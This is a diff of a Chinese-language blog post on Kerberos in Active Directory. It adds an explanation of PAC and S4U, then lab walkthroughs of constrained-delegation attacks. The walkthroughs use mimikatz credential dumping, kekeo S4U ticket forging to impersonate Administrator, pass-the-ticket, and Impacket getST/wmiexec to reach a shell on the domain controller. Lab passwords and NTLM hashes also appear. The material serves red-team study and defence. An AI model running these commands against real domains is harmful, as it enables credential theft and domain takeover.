@@ -243,12 +243,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>11.7k 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>17.1k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>44 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>65 分钟</span>
         </span>
     
     
@@ -655,11 +655,28 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
 <li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li>
 </ol>
 <p>​    其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
+<p>​    在一个域中，如何才能知道某个域用户所拥有的权限呢？自然是需要提供User的SID和所在组Group的SID。必须了解的一个前提是，KDC，A、B三者中，B只信任KDC所提供的关于A到底是什么权限，所以在域初始时，KDC上拥有A和B的权限。现在需要解决的是，KDC必须告诉B关于A的权限，这样B验证A的权限后才能决定让不让A访问自身的网络资源。</p>
+<p>​    为了让Server-B能知道Client-A所具有的权限，微软在KRB_AS_REP中的TGT中增加了Client-A的PAC（特权属性证书 ），也就是Client-A的权限，包括Client-A的SID、Group的SID：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-05-12-075438.png"
+                      alt="image-20230512155438389"
+                ></p>
+<p>​    可以看到被KDC加密的TGT中，不仅包括了被加密的Session Keya-kdc，还包括KRB_AS_REQ中申请者（Client-A）的权限属性证书，为了防止该特权证书被篡改（即使被KDC加密，Client-A也无法轻易解密，但谁也无法保证绝对的安全），在PAC的尾部添加了两个检验ServerSignature和KDCSignature:</p>
+<p>​    在这里serber Signature和KDC Signature对Client而言，Server代表的是TGS服务，KDC代表的是AS服务（AS作为Client-A与TGS的第三方信任机构）。但是AS服务与TGS服务具有相同的krgtbt账号的密码生成的，当然，整个TGT也是用KDC的密码也就是krbtgt通过它账号密码加密的，他们三者不同的是，用的算法和加密内容有所不同。</p>
+<p>​    微软是这样打算的，无论如何也要把PAC从KDC传送到Server-B，为了在Kerberos认证过程中实现，微软选择了如下做法：</p>
+<p>​    将PAC放在TGT中加密后从AS服务经Client-A中转给TGS服务，再放在由TGS服务返回的ServiceTicket中加密后经Client-A中转给Serber-B</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-091548.png"
                       alt="image-20230423171548298"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-05-12-074704.png"
+                      alt="image-20230512154703662"
                 ></p>
 <ol>
 <li><p>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p>
@@ -676,6 +693,8 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
 </li>
 </ol>
 <p>​    注意：这个和上面的详细流程有略微不同哦，因为PAC的原因</p>
+<p>​    在这里需要注意的是，在KRB_TGS_REQ阶段，携带PAC的TGT被TGS服务接收后，认证Client-A的合法性后（解密Authenticator符合要求）会将PAC解密出来，验证尾部两个签名的合法性，如何合法则认为PAC没有被篡改，于是重新在PAC的尾部更换了另外两个签名，一个是Server Signature，这次是以Server-B的密码副本生成的签名(因为对于Client-A和Server-B，这次的第三方机构是TGS)，另一个是KDC Signature，这次不再使用KDC的长期有效的key，而是使用在AS阶段生成的短期有效的SessionKeya-b。最后称为 新的PAC被拷贝在ST中被加密起来。</p>
+<p>​    最后绕来绕去，KDC上所拥有的关于Client-A的权限证书PAC终于发给了Server-B，Server-B在对Client-A进行认证的同时，也能判断Client-A有没有访问网络资源的权限。</p>
 <h3 id="AS-REQ-amp-AS-REP引出的问题"><a href="#AS-REQ-amp-AS-REP引出的问题" class="headerlink" title="AS_REQ &amp; AS_REP引出的问题"></a>AS_REQ &amp; AS_REP引出的问题</h3><h4 id="1-Pass-the-hash"><a href="#1-Pass-the-hash" class="headerlink" title="1. Pass the hash"></a>1. Pass the hash</h4><p>​    上面NTLM的时候讲过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::ekeys</span><br><span class="line">sekurlsa::pth /user:testadmin /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c</span><br></pre></td></tr></table></figure>
 
@@ -1266,8 +1285,8 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-090253.png"
-                      alt="image-20230425170252670"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-082503.png"
+                      alt="image-20230426162503045"
                 ></p>
 <p>具体说明：</p>
 <p>WIN2016 域控 hostname：DC ip：10.150.127.166</p>
@@ -1286,7 +1305,7 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
                      data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-092108.png"
                       alt="image-20230425172107303"
                 ></p>
-<p>给域用户注册SPN</p>
+<p>给域用户注册SPN，加上spn后表示其为服务用户。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test many</span><br></pre></td></tr></table></figure>
 
 <p>在域控上执行</p>
@@ -1297,6 +1316,7 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
                       alt="image-20230425172219977"
                 ></p>
 <p>然后查看many用户</p>
+<p>加上spn之后委派的选项卡才会出现，因为只有服务账户和计算机账户才可以被委派。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -1304,7 +1324,7 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
                       alt="image-20230425173920266"
                 ></p>
 <p>已经有了委派属性然后设置为非约束委派</p>
-<h6 id="查询域内设置了非约束委派的服务账户"><a href="#查询域内设置了非约束委派的服务账户" class="headerlink" title="查询域内设置了非约束委派的服务账户"></a>查询域内设置了非约束委派的服务账户</h6><p>在WEB上执行</p>
+<h5 id="查询域内设置了非约束委派的服务账户"><a href="#查询域内设置了非约束委派的服务账户" class="headerlink" title="查询域内设置了非约束委派的服务账户"></a>查询域内设置了非约束委派的服务账户</h5><p>在WEB上执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
 
 <p><img  
@@ -1313,7 +1333,7 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
                      data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-094703.png"
                       alt="image-20230425174701359"
                 ></p>
-<h6 id="查询域内设置了非约束委派的机器账户"><a href="#查询域内设置了非约束委派的机器账户" class="headerlink" title="查询域内设置了非约束委派的机器账户"></a>查询域内设置了非约束委派的机器账户</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+<h5 id="查询域内设置了非约束委派的机器账户"><a href="#查询域内设置了非约束委派的机器账户" class="headerlink" title="查询域内设置了非约束委派的机器账户"></a>查询域内设置了非约束委派的机器账户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
 
 <p><img  
                      lazyload
@@ -1323,7 +1343,8 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
                 ></p>
 <p><strong>域内域控机器账户默认设置了非约束委派</strong></p>
 <p>adfind和ldapsearch都可以查询。</p>
-<h4 id="非约束委派利用方式1"><a href="#非约束委派利用方式1" class="headerlink" title="非约束委派利用方式1"></a>非约束委派利用方式1</h4><p>环境：WEB可委派，DC是域控。</p>
+<h4 id="非约束委派利用方式1"><a href="#非约束委派利用方式1" class="headerlink" title="非约束委派利用方式1"></a>非约束委派利用方式1</h4><p>用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。</p>
+<p>环境：WEB可委派，DC是域控。</p>
 <p>先查看WEB上的票据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
 
@@ -1419,7 +1440,458 @@ Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9
                      data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165645.png"
                       alt="image-20230426005645119"
                 ></p>
-<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4>
+<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>​    因为非约束委派的不安全性，约束委派应运而生。在2003之后微软引入了非约束委派，对Kerberos引入S4U，包含了两个子协议S4U2self、S4U2proxy。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)，S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。</p>
+<p>​    在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p>
+<h5 id="S4U2Self"><a href="#S4U2Self" class="headerlink" title="S4U2Self"></a>S4U2Self</h5><p>​    允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p>
+<p>(1) 用户向 service1 发送请求。用户已通过<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/product/mfas?from=20065&from_column=20065" >身份验证<i class="fas fa-external-link-alt"></i></a>，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p>
+<p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p>
+<p>(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</p>
+<p>(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</p>
+<p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p>
+<h5 id="S4U2Proxy"><a href="#S4U2Proxy" class="headerlink" title="S4U2Proxy"></a>S4U2Proxy</h5><p>​    允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
+<p>(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</p>
+<p>(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</p>
+<p>(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p>
+<p>(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p>
+<p>(9) service2 响应步骤 8 的请求。</p>
+<p>(10) service1 响应用户对步骤 5 中的请求。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-082548.png"
+                      alt="image-20230426162547824"
+                ></p>
+<p>​    具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的<strong>可转发的TGS</strong>(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。</p>
+<p>​    <strong>如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。</strong></p>
+<p>​    此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，<strong>还可以访问使用与模拟帐户权限允许的任何服务。</strong>（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。</p>
+<p>​    如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。</p>
+<h5 id="约束性委派配置："><a href="#约束性委派配置：" class="headerlink" title="约束性委派配置："></a>约束性委派配置：</h5><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p>
+<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS <a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/product/sqlserver?from=20065&from_column=20065" >SQL Server<i class="fas fa-external-link-alt"></i></a>在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。</p>
+<p>1、先注册一个 SPN：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A <span class="title class_">SQLServer</span>/redteam.<span class="property">red</span>/<span class="variable constant_">MSSQL</span> redteam-iis</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084655.png"
+                      alt="img"
+                ></p>
+<p>此时用户 <code>redteam-iis</code> 已注册 SPN：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L redteam-iis</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084652.png"
+                      alt="img"
+                ></p>
+<p>2、然后配置服务账号：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084654.png"
+                      alt="img"
+                ></p>
+<p>3、添加一个服务：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084653.png"
+                      alt="img"
+                ></p>
+<p>4、输入域控主机名 <code>ad-2008</code> 然后点击<strong>检查名称</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084656.png"
+                      alt="img"
+                ></p>
+<p>5、选择服务为 <code>cifs</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-84655.png"
+                      alt="img"
+                ></p>
+<h5 id="查询机器主机配置约束委派"><a href="#查询机器主机配置约束委派" class="headerlink" title="查询机器主机配置约束委派"></a>查询机器主机配置约束委派</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=test,dc=local -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))“</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-030212.png"
+                      alt="image-20230426110212013"
+                ></p>
+<h5 id="查询服务账户"><a href="#查询服务账户" class="headerlink" title="查询服务账户"></a>查询服务账户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=test,dc=local -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; -dn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-030614.png"
+                      alt="image-20230426110613272"
+                ></p>
+<h4 id="约束行委派利用方式"><a href="#约束行委派利用方式" class="headerlink" title="约束行委派利用方式"></a>约束行委派利用方式</h4><p><strong>条件：</strong></p>
+<p>​    <strong>1. administrator权限</strong></p>
+<p>​    <strong>2. 获取配置了约束委派的服务账户或者机器账户的凭据 明文密码 hash都可</strong></p>
+<p>​    为了实验能成功，先使用 mimikatz 把 redteam-iis 机器的内存票据清空：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 清空内存票据</span><br><span class="line"><span class="attr">kerberos</span>::purge</span><br><span class="line"># 查看内存中的票据</span><br><span class="line"><span class="attr">kerberos</span>::list</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084746.png"
+                      alt="img"
+                ></p>
+<p>1、使用 Adfind <strong>查询约束委派的用户</strong>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AdFind</span>.<span class="property">exe</span> -h <span class="number">10.10</span><span class="number">.10</span><span class="number">.8</span> -u redteam-iis -up <span class="title class_">Server12345</span> -b <span class="string">&quot;DC=redteam,DC=red&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-84746.png"
+                      alt="img"
+                ></p>
+<p>2、利用 kekeo 请求该用户的 TGT：<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kekeo.<span class="property">exe</span> </span><br><span class="line"> </span><br><span class="line"><span class="attr">tgt</span>::ask /<span class="attr">user</span>:redteam-iis /<span class="attr">domain</span>:redteam.<span class="property">red</span> /<span class="attr">password</span>:<span class="title class_">Server12345</span> /<span class="attr">ticket</span>:administrator.<span class="property">kirbi</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084745.png"
+                      alt="img"
+                ></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用 kekeo 请求该用户的 <span class="variable constant_">TGT</span> 命令解释：</span><br><span class="line"><span class="attr">tgt</span>::ask /<span class="attr">user</span>:redteam-iis /<span class="attr">domain</span>:redteam.<span class="property">red</span> /<span class="attr">password</span>:<span class="title class_">Server12345</span> /<span class="attr">ticket</span>:administrator.<span class="property">kirbi</span></span><br><span class="line">/<span class="attr">user</span>: 服务用户的用户名</span><br><span class="line">/<span class="attr">password</span>: 服务用户的明文密码</span><br><span class="line">/<span class="attr">domain</span>: 所在域名</span><br><span class="line">/<span class="attr">ticket</span>: 指定票据名称，不过这个参数没有生效，可以忽略</span><br><span class="line"></span><br><span class="line">得到服务用户 <span class="variable constant_">TGT</span>：TGT_redteam-iis@<span class="variable constant_">REDTEAM</span>.<span class="property">RED_krbtgt</span>~redteam.<span class="property">red</span>@<span class="variable constant_">REDTEAM</span>.<span class="property">RED</span>.<span class="property">kirbi</span></span><br><span class="line">使用这张 <span class="variable constant_">TGT</span> 通过伪造 s4u 请求以 administrator 用户身份请求访问 <span class="variable constant_">AD</span>-<span class="number">2008</span> <span class="variable constant_">CIFS</span>的 <span class="variable constant_">ST</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tgs</span>::s4u /<span class="attr">tgt</span>:TGT_redteam-iis@<span class="variable constant_">REDTEAM</span>.<span class="property">RED_krbtgt</span>~redteam.<span class="property">red</span>@<span class="variable constant_">REDTEAM</span>.<span class="property">RED</span>.<span class="property">kirbi</span> /<span class="attr">user</span>:<span class="title class_">Administrator</span>@redteam.<span class="property">red</span> /<span class="attr">service</span>:cifs/<span class="variable constant_">AD</span>-<span class="number">2008.</span>redteam.<span class="property">red</span></span><br><span class="line"></span><br><span class="line">S4U2Self 获取到的 <span class="title class_">ST1</span> 以及 S4U2Proxy 获取到的 <span class="variable constant_">AD</span>-<span class="number">2008</span> <span class="variable constant_">CIFS</span> 服务的 <span class="title class_">ST2</span> 会保存在当前目录下</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p>3、使用这张 TGT (<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code>) 获取域机器的 ST：<code>TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD-2008.redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tgs</span>::s4u /<span class="attr">tgt</span>:TGT_redteam-iis@<span class="variable constant_">REDTEAM</span>.<span class="property">RED_krbtgt</span>~redteam.<span class="property">red</span>@<span class="variable constant_">REDTEAM</span>.<span class="property">RED</span>.<span class="property">kirbi</span> /<span class="attr">user</span>:<span class="title class_">Administrator</span>@redteam.<span class="property">red</span> /<span class="attr">service</span>:cifs/<span class="variable constant_">AD</span>-<span class="number">2008.</span>redteam.<span class="property">red</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084744.png"
+                      alt="img"
+                ></p>
+<p>4、使用 mimikatz 将 ST2 导入当前会话即可，如果有杀软，自行免杀，运行 mimikatz 进行 ptt：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.<span class="property">exe</span></span><br><span class="line"></span><br><span class="line"><span class="attr">kerberos</span>::ptt TGS_Administrator@redteam.<span class="property">red</span>@<span class="variable constant_">REDTEAM</span>.<span class="property">RED_cifs</span>~<span class="variable constant_">AD</span>-<span class="number">2008.</span>redteam.<span class="property">red</span>@<span class="variable constant_">REDTEAM</span>.<span class="property">RED</span>.<span class="property">kirbi</span></span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-084747.png"
+                      alt="img"
+                ></p>
+<p>这个 dir 时候就能访问到域控了，这就是整个约束委派攻击的整个利用流程！</p>
+<h4 id="约束性委派利用方式2-使用机器账户WEB的hash"><a href="#约束性委派利用方式2-使用机器账户WEB的hash" class="headerlink" title="约束性委派利用方式2(使用机器账户WEB的hash)"></a>约束性委派利用方式2(使用机器账户WEB的hash)</h4><p>先获取机器账户的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-034304.png"
+                      alt="image-20230426114302977"
+                ></p>
+<p>请求票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:WEB$ /domain:haishi.com /NTLM:48b1ee6132349190ee7c47d4b5d91608&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-034346.png"
+                      alt="image-20230426114345440"
+                ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 申请administrator权限的票据</span><br><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_WEB$@HAISHI.COM_krbtgt~haishi.com@HAISHI.COM.kirbi /user:Administrator@haishi.com /service:cifs/DC.haishi.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-034449.png"
+                      alt="image-20230426114449194"
+                ></p>
+<p>因为名字一样 把刚才的覆盖了</p>
+<p>然后导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@haishi.com@HAISHI.COM_cifs~DC.haishi.com@HAISHI.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 访问</span><br><span class="line">dir \\DC.haishi.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="约束性委派利用方式3-使用机器账户WEB的hash-远程wmiexec"><a href="#约束性委派利用方式3-使用机器账户WEB的hash-远程wmiexec" class="headerlink" title="约束性委派利用方式3(使用机器账户WEB的hash 远程wmiexec)"></a>约束性委派利用方式3(使用机器账户WEB的hash 远程wmiexec)</h4><p>先获取机器账户的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-26-034304.png"
+                      alt="image-20230426114302977"
+                ></p>
+<p>用getST申请服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.150.127.166 -spn CIFS/DC.haishi.com -impersonate administrator haishi.com/WEB$ -hashes :48b1ee6132349190ee7c47d4b5d91608</span><br></pre></td></tr></table></figure>
+
+<p>然后导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -k haishi.com/administrator@DC.haishi.com -no-pass -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小tips</p>
+<p>需要将域名加入到hosts</p>
+<p><img  
+                     lazyload
